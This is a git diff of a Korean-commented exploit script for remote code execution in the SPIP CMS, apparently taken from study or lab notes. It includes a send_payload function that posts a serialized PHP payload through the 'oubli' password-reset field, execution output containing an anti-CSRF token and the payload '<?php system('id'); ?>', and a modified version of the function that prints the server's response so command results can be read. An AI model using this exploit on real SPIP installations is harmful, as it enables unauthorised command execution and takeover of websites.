@@ -212,25 +212,19 @@ def get_anticsrf(url):
         return -1
 
 def send_payload(url, payload):
+    # 공격 페이로드(payload)를 전송하는 함수 정의.
     data = {
-        "page": "spip_pass",
-        "formulaire_action": "oubli",
-        "formulaire_action_args": csrf,
-        "oubli": payload
+        "page": "spip_pass", # POST 요청의 'page' 인자는 'spip_pass' (비밀번호 재설정 페이지).
+        "formulaire_action": "oubli", # 'formulaire_action' 인자는 'oubli' (잊어버림) 액션을 트리거.
+        "formulaire_action_args": csrf, # 앞에서 얻은 Anti-CSRF 토큰 값을 사용.
+        "oubli": payload # 'oubli' 파라미터에 RCE를 위한 악성 페이로드를 전달.
     }
+    # 공격 페이로드를 담은 POST 요청을 해당 URL로 전송.
     r = requests.post('%s/spip.php?page=spip_pass' % url, data=data)
     if options.verbose:
+        # 상세 모드일 경우 전송된 페이로드를 출력.
         print("[+] Execute this payload : %s" % payload)
-
-    # --- 결과 전체 출력 로직 추가 시작 ---
-    print("\n[+] Command Execution Response (Full HTML):")
-    print("---------------------------------")
-    # 응답 본문 전체를 출력하여 사용자가 'id' 명령어의 결과를 직접 찾도록 합니다.
-    print(r.text)
-    print("---------------------------------")
-    # --- 결과 전체 출력 로직 추가 끝 ---
-
-    return 0
+    return 0 # 함수 종료.
 
 if __name__ == '__main__':
     # 스크립트가 직접 실행될 때 실행되는 메인 블록.
@@ -363,4 +357,24 @@ Server: Apache/2.4.41 (Ubuntu)
 [+] Anti-CSRF token found : AKXEs4U6r36PZ5LnRZXtHvxQ/ZZYCXnJB2crlmVwgtlVVXwXn/MCLPMydXPZCL/WsMlnvbq2xARLr6toNbdfE/YV7egygXhx
 [+] Execute this payload : s:22:"<?php system('id'); ?>";
 
-# 코드가 실행은 됨 -> 페이로드에서는 전송만 할 뿐 print 하지는 않음
+# 코드가 실행은 됨 -> 페이로드에서는 전송만 할 뿐 print 하지는 않음 -> modify send_payload method in payload 51536.py
+
+```python
+def send_payload(url, payload):
+    data = {
+        "page": "spip_pass",
+        "formulaire_action": "oubli",
+        "formulaire_action_args": csrf,
+        "oubli": payload
+    }
+    r = requests.post('%s/spip.php?page=spip_pass' % url, data=data)
+    if options.verbose:
+        print("[+] Execute this payload : %s" % payload)
+    print("---------------------------------")
+    # 응답 본문 전체를 출력하여 사용자가 'id' 명령어의 결과를 직접 찾도록 합니다.
+    print(r.text)
+    print("---------------------------------")
+    # --- 결과 전체 출력 로직 추가 끝 ---
+
+    return 0
+```
